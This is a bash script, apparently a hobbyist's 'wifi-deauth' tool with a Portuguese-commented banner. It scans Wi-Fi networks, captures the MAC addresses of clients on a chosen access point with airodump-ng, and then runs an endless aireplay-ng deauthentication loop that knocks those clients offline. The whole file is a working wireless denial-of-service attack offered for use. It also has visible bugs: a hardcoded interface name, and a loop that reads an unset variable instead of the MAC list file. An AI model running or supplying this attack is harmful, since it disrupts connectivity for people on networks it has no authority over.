#!/bin/bash

echo -e "\033[0;32m          _  __ _           _                  _   _           _     \033[0m"
echo -e "\033[0;32m__      _(_)/ _(_)       __| | ___  __ _ _   _| |_| |__    ___| |__  \033[0m"
echo -e "\033[0;32m\ \ /\ / / | |_| |_____ / _  |/ _ \/ _  | | | | __|  _ \  / __|  _ \  \033[0m"
echo -e "\033[0;32m \ V  V /| |  _| |V 1.0| (_| |  __/ (_| | |_| | |_| | | |_\__ \ | | | \033[0m"
echo -e "\033[0;32m  \_/\_/ |_|_| |_|      \__ _|\___|\__ _|\__ _|\__|_| |_(_)___/_| |_| \033[0m"
echo -e "\033[0;32mInstagram: @rafael_cyber1\033[0m"
echo ""

scan=$(nmcli dev wifi); echo -e "\033[0;32m$scan\033[0m"

# read ler ler a informação
echo -e "\n\033[0;32mTarget BSSID:\033[0m"
read bssid

echo -e "\n\033[0;32mTarget Channel:\033[0m"
read channel

echo -e "\n\033[0;32mYour Wifi Interface:\033[0m"
read interface

start=$(airmon-ng start $interface)
mon=$(echo "${interface}mon") # adciona mon no nome da interface

# airodump-ng é executado em segundo plano (&), e o comando pid=$! captura o PID do processo em segundo plano para que possamos matá-lo depois.
# sleep 20: Dá 20 segundos para o airodump-ng coletar pacotes.
# kill $pid: Mata o processo do airodump-ng após o tempo especificado.

airodump-ng -c $channel --bssid $bssid $mon --output-format csv -w result-air & pid=$!; sleep 20; kill $pid; grep ":" result-air-01.csv | sed 's/,.*//' > list_macs.txt
clear
rm result-air-01.csv

# while true; do cria um loop infinito
# while cria um loop condicional. read lé e guarda o valor em mac que vai ser usado no aireplay-ng
# -r instrui o read a não interpretar caracteres de barra invertida (\) como caracteres especiais.
# do o loop continuará até que não haja mais entradas para ler ou até que o script seja interrompido.

while true; do
  while read -r mac; do
    aireplay-ng -0 1 -a $bssid -c $mac wlo1mon
    sleep 2
  done < $list_macs
done
